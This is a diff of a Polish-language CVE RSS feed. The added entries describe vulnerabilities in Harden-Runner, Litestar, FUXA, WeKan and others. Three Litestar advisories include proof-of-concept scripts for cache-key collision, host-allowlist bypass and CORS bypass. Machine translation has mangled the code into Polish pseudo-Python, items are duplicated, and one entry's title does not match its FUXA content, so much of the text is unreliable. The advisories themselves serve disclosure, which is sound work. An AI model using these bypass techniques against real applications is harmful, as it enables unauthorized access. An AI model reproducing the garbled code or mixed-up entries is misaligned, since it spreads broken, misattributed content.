@@ -1,5 +1,203 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-59024</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-59024</link><pubDate>Mon, 09 Feb 2026 14:44:28 +0000</pubDate><description>Stworzone delegacje lub fragmenty IP mogą zatruć delegacje buforowane w Recursorze.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-25598</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25598</link><pubDate>Mon, 09 Feb 2026 17:19:14 +0000</pubDate><description>## Podsumowanie
+
+W akcji Harden-Runner GitHub (warstwa społeczności) wykryto lukę w zabezpieczeniach, która umożliwia wychodzącym połączeniom sieciowym ominięcie rejestrowania audytu.W szczególności ruch wychodzący wykorzystujący wywołania systemowe gniazd `sendto`, `sendmsg` i `sendmmsg` może ominąć wykrywanie i rejestrowanie podczas korzystania z `egress-policy: audyt`.
+
+**Uwaga:** Ta luka dotyczy wyłącznie trybu audytu.Podczas korzystania z `egress-policy: block` te połączenia są prawidłowo blokowane.Wymaga to, aby osoba atakująca miała już możliwości wykonania kodu w ramach przepływu pracy GitHub Actions (np. poprzez wstrzyknięcie przepływu pracy lub zagrożone zależności).
+
+## Wersje, których dotyczy problem
+
+- Poziom społeczności Harden-Runner: wszystkie wersje wcześniejsze niż v2.14.2
+- Poziom Enterprise Harden-Runner: **NIE DOTYCZY**
+
+## Dotkliwość
+
+**Średni** — ta luka wpływa na możliwości rejestrowania inspekcji, ale wymaga, aby osoba atakująca miała już możliwość wykonania kodu w ramach przepływu pracy.
+
+## Wpływ
+
+Gdy Harden-Runner jest skonfigurowany w trybie audytu („egress-policy: audyt”), osoby atakujące posiadające możliwość wykonania dowolnego kodu w przepływie pracy mogą:
+- Wysyłaj wychodzący ruch sieciowy bez generowania dzienników audytu
+- Obejście monitorowania sieci dla komunikacji opartej na UDP
+
+**Ważne:** Ta luka wymaga, aby osoba atakująca miała już możliwość wykonania kodu w ramach przepływu pracy GitHub Actions (np. poprzez wstrzyknięcie przepływu pracy lub zagrożone zależności).
+
+## Szczegóły techniczne
+
+Luka wynika z niepełnego zasięgu monitorowania niektórych wywołań systemowych związanych z gniazdami.W szczególności do wysyłania ruchu UDP bez wyzwalania zdarzeń kontrolnych można używać następujących wywołań systemowych:
+
+- `wyślij do()'
+
+- `wyślij wiadomość()'
+
+- `wyślijmmsg()`
+
+Osoba atakująca wykonująca kod w ramach przepływu pracy może skompilować i wykonać kod natywny, który wykorzystuje te wywołania systemowe w celu ustanowienia ukrytych kanałów komunikacji.
+
+## Dotknięci użytkownicy
+
+**Ta luka dotyczy TYLKO użytkowników poziomu społeczności Harden-Runner.**
+
+Poziom Enterprise Harden-Runner **NIE jest podatny** na tę technikę obejścia.
+
+## Naprawa
+
+### Dla użytkowników poziomu społeczności
+
+**Uaktualnij program Harden-Runner do wersji 2.14.2 lub nowszej.** Ta wersja zawiera poprawki dotyczące luki w zabezpieczeniach umożliwiającej obejście rejestrowania.
+
+### Dla użytkowników warstwy Enterprise
+
+Nie jest wymagane żadne działanie.Ta luka nie dotyczy klientów w warstwie Enterprise.
+
+## Kredyt
+
+Chcielibyśmy podziękować [Devanshowi Bathamowi](https://github.com/devanshbatham) za odpowiedzialne ujawnienie tej luki w naszym procesie raportowania bezpieczeństwa.Devansh był komunikatywny przez cały proces i zweryfikował poprawkę przed jej upublicznieniem.</description></item><item><title>CVE-2026-25480</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25480</link><pubDate>Mon, 09 Feb 2026 17:19:06 +0000</pubDate><description>### Podsumowanie
+FileStore mapuje klucze pamięci podręcznej na nazwy plików przy użyciu normalizacji Unicode NFKD i podstawienia or() bez separatorów, tworząc kolizje klawiszy.Gdy FileStore jest używany jako zaplecze pamięci podręcznej odpowiedzi, nieuwierzytelniony zdalny atakujący może wywołać kolizje kluczy pamięci podręcznej za pośrednictwem spreparowanych ścieżek, powodując, że jeden adres URL będzie udostępniał odpowiedzi z pamięci podręcznej innego (zatruwanie/pomieszanie pamięci podręcznej).
+
+### Szczegóły
+litestar.stores.file._safe_file_name() normalizuje dane wejściowe za pomocą unicodedata.normalize("NFKD", nazwa) i buduje nazwę pliku poprzez połączenie c if alfanumeryczne else str(ord(c)) (bez ogranicznika).
+Transformacja ta nie jest iniekcyjna, np.:
+
+- „k-” i „k45” stają się „k45” (ponieważ - ord('-') == 45)
+- „k/\n” staje się „k4710”, kolidując z „k4710”
+- „K” (znak Kelvina) normalizuje się do „K”, kolidując z „K”
+
+W przypadku użycia w buforowaniu odpowiedzi domyślny klucz pamięci podręcznej zawiera ścieżkę żądania i posortowane parametry zapytania, które są kontrolowane przez osobę atakującą.
+
+### PoC
+
+```
+importuj asyncio, plik tymczasowy
+z litestar.stores.file importuj FileStore
+
+async def main():
+d = tempfile.mkdtemp(prefix="ls_filestore_poc_")
+store = FileStore(d, create_directories=True)
+czekaj na sklep.__aenter__()
+
+# 1) Kolizja ordów ASCII: „-” -&gt; 45
+czekaj na sklep.set("k-", b"A")
+v = czekaj na sklep.get("k45")
+print("k- -&gt;", v)
+print("k45 -&gt;", czekaj na sklep.get("k45"))
+jeśli v == b"A":
+print("BEZPIECZEŃSTWO: 'k-' koliduje z 'k45'")
+
+#2) Kolizja NFKD: znak Kelvina -&gt; K
+czekaj na sklep.set("K", b"B") # U+212A
+v2 = czekaj na sklep.get("K")
+print("K -&gt;", czekaj na sklep.get("K"))
+print("K -&gt;", v2)
+jeśli v2 == b"B":
+print("BEZPIECZNY: 'K' koliduje z 'K' (NFKD)")
+
+if __name__ == "__main__":
+asyncio.run(main())
+```
+
+### Wpływ
+Typ luki: zatrucie pamięci podręcznej / kolizja klucza pamięci podręcznej.
+Wdrożenia, których dotyczy problem: aplikacje korzystające z buforowania odpowiedzi Litestar z zapleczem FileStore (lub dowolnego klucza do FileStore pod wpływem atakującego).
+Możliwy wpływ: wyświetlanie nieprawidłowej treści z pamięci podręcznej pod różnymi adresami URL, potencjalne problemy z poufnością/integralnością w zależności od tego, jakie punkty końcowe są buforowane.</description></item><item><title>CVE-2026-25479</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25479</link><pubDate>Mon, 09 Feb 2026 17:19:00 +0000</pubDate><description>### Podsumowanie
+Sprawdzanie poprawności hosta w witrynie AuthorizedHosts można ominąć, ponieważ skonfigurowane wzorce hosta są przekształcane w wyrażenia regularne bez ucieczki przed metaznakami wyrażeń regularnych (zwłaszcza .).Skonfigurowany wpis na liście dozwolonych, taki jak example.com, może pasować do exampleXcom
+
+### Szczegóły
+W litestar.middleware.allowed_hosts wpisy listy dozwolonych są kompilowane we wzorce wyrażeń regularnych w sposób, który pozwala metaznakom wyrażeń regularnych zachować specjalne znaczenie (np. . dopasowuje dowolny znak).Umożliwia to obejście, w przypadku którego osoba atakująca dostarcza hosta pasującego do wyrażenia regularnego, ale nie będącego zamierzoną dosłowną nazwą hosta.
+
+### PoC
+Serwer (poc_allowed_hosts_server.py)
+
+```
+z Litestar import Litestar, pobierz
+z litestar.middleware.allowed_hosts zaimportuj dozwolone hostyConfig
+
+@get("/")
+async def indeks() -&gt; str:
+zwróć „ok”
+
+config = EnabledHostsConfig(allowed_hosts=["example.com"])
+aplikacja = Litestar([indeks], dozwolone_hosts_config=config)
+```
+
+`uvicorn poc_allowed_hosts_server:app --host 127.0.0.1 --port 8001`
+
+Klient (poc_allowed_hosts_client.py)
+
+```
+zaimportuj klienta http
+
+def req(nagłówek_hosta: str) -&gt; krotka[int, bajty]:
+c = http.client.HTTPConnection("127.0.0.1", 8001, limit czasu=3)
+c.request("GET", "/", headers={"Host": nagłówek_hosta})
+r = c.getresponse()
+ciało = r.read()
+c.zamknij()
+zwróć r.status, treść
+
+print("zło.com:", *req("zło.com"))
+print("przykładXcom:", *req("przykładXcom"))
+```
+
+Oczekiwane (niebezpieczne zachowanie):
+Host: evil.com → 400 nieprawidłowy host
+
+Host: przykładXcom → 200 ok (obejście)
+
+### Wpływ
+Typ: obejście kontroli bezpieczeństwa (lista dozwolonych hostów)
+Kogo dotyczy problem: aplikacje korzystające z usługiAlledHosts w celu zapobiegania atakom na nagłówki hosta (zatruwanie pamięci podręcznej, nadużycia w konstrukcji bezwzględnych adresów URL, zatruwanie linków do resetowania hasła itp.).Dalszy wpływ zależy od zachowania aplikacji, ale obejście pokonuje podstawową warstwę łagodzącą.</description></item><item><title>CVE-2026-25478</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25478</link><pubDate>Mon, 09 Feb 2026 17:18:52 +0000</pubDate><description>### Podsumowanie
+Sprawdzanie pochodzenia CORS można ominąć, ponieważ lista dozwolonych źródeł jest kompilowana do wyrażenia regularnego bez ucieczki przed metaznakami (zwłaszcza .).Dozwolone źródło, takie jak https://good.example, może pasować do https://goodXexample, co powoduje ustawienie Access-Control-Allow-Origin na niezaufane źródło
+
+### Szczegóły
+CORSConfig.allowed_origins_regex jest tworzony przy użyciu wyrażenia regularnego utworzonego na podstawie skonfigurowanych wartości listy dozwolonych i używanego z funkcją fullmatch() do sprawdzania poprawności.Ponieważ metaznaki nie są modyfikowane, złośliwe źródło może zostać nieoczekiwanie dopasowane.Kontrola opiera się na valid_origins_regex.fullmatch(origin).
+
+### PoC
+Serwer (poc_cors_server.py)
+
+```
+z Litestar import Litestar, pobierz
+z litestar.config.cors zaimportuj CORSConfig
+
+@get("/c")
+async def c() -&gt; str:
+zwróć „ok”
+
+cors = CORSConfig(
+allow_origins=["https://dobry.przykład"],
+zezwolenie_credentials=Prawda,
+)
+aplikacja = Litestar([c], cors_config=cors)
+```
+
+`uvicorn poc_cors_server: aplikacja --host 127.0.0.1 --port 8002`
+
+Klient (poc_cors_client.py)
+
+```
+zaimportuj klienta http
+
+def req(Origin: str) -&gt; krotka[int, str |Brak]:
+c = http.client.HTTPConnection("127.0.0.1", 8002, limit czasu=3)
+c.request("GET", "/c", headers={"Origin": pochodzenie, "Host": "example.com"})
+r = c.getresponse()
+r.czytaj()
+acao = r.getheader("Kontrola dostępu-Zezwól na pochodzenie")
+c.zamknij()
+zwróć r.status, acao
+
+print("zło:", req("https://zło.przykład"))
+print("pomiń:", req("https://goodXexample"))
+```
+
+Oczekiwane (niebezpieczne zachowanie):
+
+Pochodzenie: https://evil.example → brak ACAO
+Pochodzenie: https://goodXexample → ACAO: https://goodxexample/ (obejście)
+
+### Wpływ
+Typ: obejście zasad CORS (ryzyko narażenia danych z różnych źródeł)
+Kogo dotyczy to: aplikacje korzystające z list dozwolonych CORS w celu ograniczenia odczytów między źródłami przeglądarek.Jeśli zezwolenie_credentials=True i uwierzytelnione punkty końcowe zwrócą wrażliwe dane, witryna kontrolowana przez osobę atakującą może potencjalnie odczytać odpowiedzi w sesji przeglądarki ofiary.</description></item><item><title>CVE-2025-59024</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-59024</link><pubDate>Mon, 09 Feb 2026 14:44:28 +0000</pubDate><description>Stworzone delegacje lub fragmenty IP mogą zatruć delegacje buforowane w Recursorze.
 
 CVSS Score: 6.5 (medium)</description></item><item><title>CVE-2026-2225</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-2225</link><pubDate>Mon, 09 Feb 2026 09:02:07 +0000</pubDate><description>Znaleziono błąd w kodzie źródłowym News Portal Project 1.0.Podatnością dotknięta jest nieznany kod pliku /admin/index.php komponentu Administrator Login.Ta manipulacja argumentem email powoduje wstrzyknięcie sql.Atak może zostać zainicjowany zdalnie.Exploit został opublikowany i może zostać wykorzystany.
 
@@ -1416,9 +1614,46 @@ Dostawca został wcześnie powiadomiony o tej luce, ale nie udzielił odpowiedzi
 
 CVSS Score: 8.8 (high)</description></item><item><title>CVE-2025-11730</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-11730</link><pubDate>Thu, 05 Feb 2026 01:55:12 +0000</pubDate><description>Luka w zabezpieczeniach polegająca na wstrzykiwaniu poleceń po uwierzytelnieniu w poleceniu CLI konfiguracji dynamicznego DNS (DDNS) w wersjach oprogramowania sprzętowego serii Zyxel ATP od V5.35 do V5.41, wersjach oprogramowania sprzętowego serii USG FLEX od V5.35 do V5.41, wersjach oprogramowania sprzętowego serii USG FLEX 50(W) od V5.35 do V5.41 i wersjach oprogramowania sprzętowego serii USG20(W)-VPN od V5.35do wersji 5.41 może pozwolić uwierzytelnionej osobie atakującej z uprawnieniami administratora na wykonanie poleceń systemu operacyjnego (OS) na zagrożonym urządzeniu poprzez dostarczenie specjalnie spreparowanego ciągu znaków jako argumentu polecenia CLI.
 
-CVSS Score: 7.2 (high)</description></item><item><title>CVE-2026-1898</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1898</link><pubDate>Thu, 05 Feb 2026 00:32:09 +0000</pubDate><description>W WeKan do wersji 8.20 została stwierdzona podatność.Dotyczy to nieznanej części pliku packages/wekan-ldap/server/syncUser.js komponentu LDAP User Sync.Ta manipulacja powoduje niewłaściwą kontrolę dostępu.Istnieje możliwość zdalnego zainicjowania ataku.Aktualizacja do wersji 8.21 może złagodzić ten problem.Nazwa poprawki: 146905a459106b5d00b4f09453a6554255e6965a.Należy zaktualizować komponent, którego dotyczy problem.
+CVSS Score: 7.2 (high)</description></item><item><title>CVE-2026-25895</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25895</link><pubDate>Thu, 05 Feb 2026 00:37:30 +0000</pubDate><description>### Podsumowanie
+**Opis**
+Luka w zabezpieczeniach FUXA umożliwiająca przekroczenie ścieżki umożliwia nieuwierzytelnionemu zdalnemu atakującemu zapisanie dowolnych plików w dowolnych lokalizacjach w systemie plików serwera.Dotyczy to FUXA do wersji 1.2.9.Ten problem został naprawiony w wersji FUXA 1.2.10.
 
-CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2019-25267</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25267</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wing FTP Server 6.0.7 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną w konfiguracji usługi w celu wstrzyknięcia złośliwych plików wykonywalnych, które zostaną uruchomione z uprawnieniami systemu lokalnego.</description></item><item><title>CVE-2019-25271</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25271</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>NETGATE Data Backup 3.0.620 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w konfiguracji usługi NGDatBckpSrv Windows.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę do wstrzyknięcia i wykonania złośliwego kodu z uprawnieniami LocalSystem, umieszczając pliki wykonywalne w określonych lokalizacjach katalogów.</description></item><item><title>CVE-2019-25275</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25275</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>BartVPN 1.2.2 zawiera niecytowaną lukę w ścieżce usługi w BartVPNService, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną, umieszczając złośliwe pliki wykonywalne w określonych lokalizacjach systemu plików w celu przejęcia kontekstu wykonywania usługi.</description></item><item><title>CVE-2019-25276</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25276</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Studio 5000 Logix Designer 30.01.00 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze aktywacji FactoryTalk, która umożliwia użytkownikom lokalnym potencjalne wykonanie kodu z podwyższonymi uprawnieniami.Atakujący mogą wykorzystać niecytowaną ścieżkę w C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\, aby wstrzyknąć złośliwy kod, który mógłby zostać wykonany z uprawnieniami LocalSystem.</description></item><item><title>CVE-2019-25272</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25272</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>TexasSoft CyberPlanet 6.4.131 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze CCSrvProxy, która umożliwia lokalnym atakującym wykonanie dowolnego kodu.Atakujący mogą wykorzystać niecytowaną ścieżkę w „C:\Program Files (x86)\TenaxSoft\CyberPlanet\SrvProxy.exe”, aby wstrzyknąć złośliwe pliki wykonywalne i uzyskać podwyższone uprawnienia systemowe.</description></item><item><title>CVE-2019-25288</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25288</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wacom WTabletService 6.6.7-3 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym wykonanie złośliwego kodu z podwyższonymi uprawnieniami.Osoby atakujące mogą wstawić plik wykonywalny do ścieżki usługi, aby uruchomić nieautoryzowany kod po ponownym uruchomieniu usługi lub ponownym uruchomieniu systemu.</description></item><item><title>CVE-2019-25281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25281</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Klient NCP Secure Entry 9.2 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w wielu usługach systemu Windows, która umożliwia lokalnym użytkownikom potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowane ścieżki w usługach takich jak ncprwsnt, rwsrsu, ncpclcfg i NcpSec w celu wstrzyknięcia złośliwego kodu, który będzie wykonywany z uprawnieniami LocalSystem podczas uruchamiania usługi.</description></item><item><title>CVE-2019-25274</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25274</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>ProShow Producer 9.0.3797 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze ScsiAccess, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną do wstrzyknięcia złośliwych plików wykonywalnych, które będą uruchamiane z uprawnieniami systemu lokalnego podczas uruchamiania usługi.</description></item><item><title>CVE-2026-1896</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1896</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>W WeKan do wersji 8.20 została odkryta podatność.Podatnością dotknięta jest funkcja ComprehensiveBoardMigration w serwerze plików/migrations/comprehensiveBoardMigration.js w komponencie Migration Operation Handler.Manipulowanie argumentem boardId prowadzi do nieprawidłowej kontroli dostępu.Atak jest możliwy do przeprowadzenia zdalnie.Aktualizacja do wersji 8.21 rozwiązuje ten problem.Identyfikator poprawki to cc35dafef57ef6e44a514a523f9a8d891e74ad8f.Zalecana jest aktualizacja komponentu, którego dotyczy problem.</description></item><item><title>CVE-2025-68643</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68643</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Serwer pocztowy Axigen w wersji wcześniejszej niż 10.5.57 umożliwia przechowywanie skryptów krzyżowych (XSS) w obsłudze parametru preferencji konta timeFormat.Atakujący mogą to wykorzystać, przeprowadzając atak wieloetapowy.Na pierwszym etapie do preferencji timeFormat wstrzykiwany jest szkodliwy ładunek JavaScript, wykorzystując osobną lukę w zabezpieczeniach lub przejęte dane uwierzytelniające.W drugim etapie, gdy ofiara loguje się do interfejsu WebMail, niezaczyszczona wartość timeFormat jest ładowana z pamięci i wstawiana do modelu DOM, powodując wykonanie wstrzykniętego skryptu.</description></item><item><title>CVE-2025-69906</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69906</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Monstra CMS v3.0.4 zawiera lukę w zabezpieczeniach umożliwiającą przesyłanie plików we wtyczce Files Manager.Aplikacja opiera się na sprawdzaniu rozszerzeń plików w oparciu o czarną listę i przechowuje przesłane pliki bezpośrednio w katalogu dostępnym w Internecie.W typowych konfiguracjach serwerów może to umożliwić osobie atakującej przesłanie plików interpretowanych jako kod wykonywalny, co skutkuje zdalnym wykonaniem kodu.</description></item><item><title>CVE-2025-69619</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69619</link><pubDate>Thu, 05 Feb 2026 00:00:00 +0000</pubDate><description>Przekroczenie ścieżki w My Text Editor v1.6.2 umożliwia atakującym wywołanie ataku typu „odmowa usługi” (DoS) poprzez zapisanie plików w pamięci wewnętrznej.</description></item><item><title>CVE-2023-43637</title><link>https://nvd.nist.gov/vuln/detail/CVE-2023-43637</link><pubDate>Wed, 04 Feb 2026 23:21:25 +0000</pubDate><description>### Wpływ
+### Wpływ
+Ma to wpływ na wszystkie wdrożenia, w tym te z ustawieniem „runtime.settings.secureEnabled” na „true”.
+
+Eksploatacja umożliwia nieuwierzytelnionemu zdalnemu atakującemu nadpisanie plików aplikacji i systemu.Jeśli atakujący może nadpisać kod aplikacji, skrypty startowe lub pliki konfiguracyjne, które zostaną później wykonane/załadowane, jest prawdopodobne, że nastąpi RCE.W zależności od konfiguracji wdrożenia i uprawnień może to prowadzić do pełnego naruszenia bezpieczeństwa systemu i jeszcze bardziej narazić podłączone środowiska ICS/SCADA na dalsze działania.
+
+### Poprawki
+Ten problem został naprawiony w wersji FUXA 1.2.10.Zdecydowanie zachęca się użytkowników do aktualizacji do najnowszej dostępnej wersji.
+
+### Notatki
+GitHub stwierdził, że ta luka jest identyczna z luką CVE-2025-69981, która została opublikowana w repozytorium poza pasmem przed zakończeniem skoordynowanego ujawnienia.CVE-2025-69981 opisuje lukę w zabezpieczeniach „CWE-434: Nieograniczone przesyłanie plików o niebezpiecznym typie”.Chociaż obecny jest CWE-434, była to niebezpieczna, zamierzona funkcja aplikacji, która została zablokowana za uwierzytelnieniem.Ten raport opisuje „CWE-35: Path Traversal”, który umożliwia dowolny zapis pliku.</description></item><item><title>CVE-2026-25894</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25894</link><pubDate>Thu, 05 Feb 2026 00:36:30 +0000</pubDate><description>### Opis
+Niezabezpieczona domyślna konfiguracja w FUXA umożliwia nieuwierzytelnionemu zdalnemu atakującemu uzyskanie dostępu administracyjnego i wykonanie dowolnego kodu na serwerze.Dotyczy to FUXA do wersji 1.2.9, gdy włączone jest uwierzytelnianie, ale klucz tajny JWT administratora nie jest skonfigurowany.Ten problem został naprawiony w wersji FUXA 1.2.10.
+
+### Wpływ
+Dokumentacja FUXA umożliwia administratorom ręczną aktualizację zakodowanego na stałe sekretu JWT podczas włączania uwierzytelniania.Ta funkcja nie była dostępna w interfejsie użytkownika.Powoduje to stan bezpieczeństwa, w którym aplikacja może raportować lub sprawiać wrażenie, że działa w trybie „bezpiecznym”, jednocześnie akceptując tokeny podpisane publicznie znanym kluczem.
+
+Eksploatacja umożliwia nieuwierzytelnionemu, zdalnemu atakującemu sfałszowanie tokenów JWT w celu ominięcia wszystkich mechanizmów uwierzytelniania i uzyskania dostępu administracyjnego do instancji FUXA.Dzięki tym podwyższonym uprawnieniom osoba atakująca może wchodzić w interakcję z administracyjnymi interfejsami API, w tym z funkcjami przeznaczonymi do automatyzacji i tworzenia skryptów, w celu wykonania dowolnego kodu w kontekście usługi FUXA.W zależności od konfiguracji wdrożenia i uprawnień może to prowadzić do pełnego naruszenia bezpieczeństwa systemu i jeszcze bardziej narazić podłączone środowiska ICS/SCADA na dalsze działania.
+
+### Poprawki
+Ten problem został naprawiony w wersji FUXA 1.2.10.Zdecydowanie zachęca się użytkowników do aktualizacji do najnowszej dostępnej wersji.
+
+### Notatki
+GitHub stwierdził, że ta luka jest identyczna z luką CVE-2025-69971, która została opublikowana w repozytorium poza pasmem przed zakończeniem skoordynowanego ujawnienia.CVE-2025-69971 jest poprawny kierunkowo, ale opis jest niedokładny.Prawidłowy opis i wersje, których dotyczy problem, można znaleźć w tym poradniku.</description></item><item><title>CVE-2026-1898</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1898</link><pubDate>Thu, 05 Feb 2026 00:32:09 +0000</pubDate><description>W WeKan do wersji 8.20 została stwierdzona podatność.Dotyczy to nieznanej części pliku packages/wekan-ldap/server/syncUser.js komponentu LDAP User Sync.Ta manipulacja powoduje niewłaściwą kontrolę dostępu.Istnieje możliwość zdalnego zainicjowania ataku.Aktualizacja do wersji 8.21 może złagodzić ten problem.Nazwa poprawki: 146905a459106b5d00b4f09453a6554255e6965a.Należy zaktualizować komponent, którego dotyczy problem.
+
+CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2019-25267</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25267</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wing FTP Server 6.0.7 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną w konfiguracji usługi w celu wstrzyknięcia złośliwych plików wykonywalnych, które zostaną uruchomione z uprawnieniami systemu lokalnego.</description></item><item><title>CVE-2019-25271</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25271</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>NETGATE Data Backup 3.0.620 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w konfiguracji usługi NGDatBckpSrv Windows.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę do wstrzyknięcia i wykonania złośliwego kodu z uprawnieniami LocalSystem, umieszczając pliki wykonywalne w określonych lokalizacjach katalogów.</description></item><item><title>CVE-2019-25275</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25275</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>BartVPN 1.2.2 zawiera niecytowaną lukę w ścieżce usługi w BartVPNService, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną, umieszczając złośliwe pliki wykonywalne w określonych lokalizacjach systemu plików w celu przejęcia kontekstu wykonywania usługi.</description></item><item><title>CVE-2019-25276</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25276</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Studio 5000 Logix Designer 30.01.00 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze aktywacji FactoryTalk, która umożliwia użytkownikom lokalnym potencjalne wykonanie kodu z podwyższonymi uprawnieniami.Atakujący mogą wykorzystać niecytowaną ścieżkę w C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\, aby wstrzyknąć złośliwy kod, który mógłby zostać wykonany z uprawnieniami LocalSystem.</description></item><item><title>CVE-2019-25272</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25272</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>TexasSoft CyberPlanet 6.4.131 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze CCSrvProxy, która umożliwia lokalnym atakującym wykonanie dowolnego kodu.Atakujący mogą wykorzystać niecytowaną ścieżkę w „C:\Program Files (x86)\TenaxSoft\CyberPlanet\SrvProxy.exe”, aby wstrzyknąć złośliwe pliki wykonywalne i uzyskać podwyższone uprawnienia systemowe.</description></item><item><title>CVE-2019-25288</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25288</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wacom WTabletService 6.6.7-3 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym wykonanie złośliwego kodu z podwyższonymi uprawnieniami.Osoby atakujące mogą wstawić plik wykonywalny do ścieżki usługi, aby uruchomić nieautoryzowany kod po ponownym uruchomieniu usługi lub ponownym uruchomieniu systemu.</description></item><item><title>CVE-2019-25281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25281</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Klient NCP Secure Entry 9.2 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w wielu usługach systemu Windows, która umożliwia lokalnym użytkownikom potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowane ścieżki w usługach takich jak ncprwsnt, rwsrsu, ncpclcfg i NcpSec w celu wstrzyknięcia złośliwego kodu, który będzie wykonywany z uprawnieniami LocalSystem podczas uruchamiania usługi.</description></item><item><title>CVE-2019-25274</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25274</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>ProShow Producer 9.0.3797 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze ScsiAccess, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną do wstrzyknięcia złośliwych plików wykonywalnych, które będą uruchamiane z uprawnieniami systemu lokalnego podczas uruchamiania usługi.</description></item><item><title>CVE-2026-1896</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1896</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>W WeKan do wersji 8.20 została odkryta podatność.Podatnością dotknięta jest funkcja ComprehensiveBoardMigration w serwerze plików/migrations/comprehensiveBoardMigration.js w komponencie 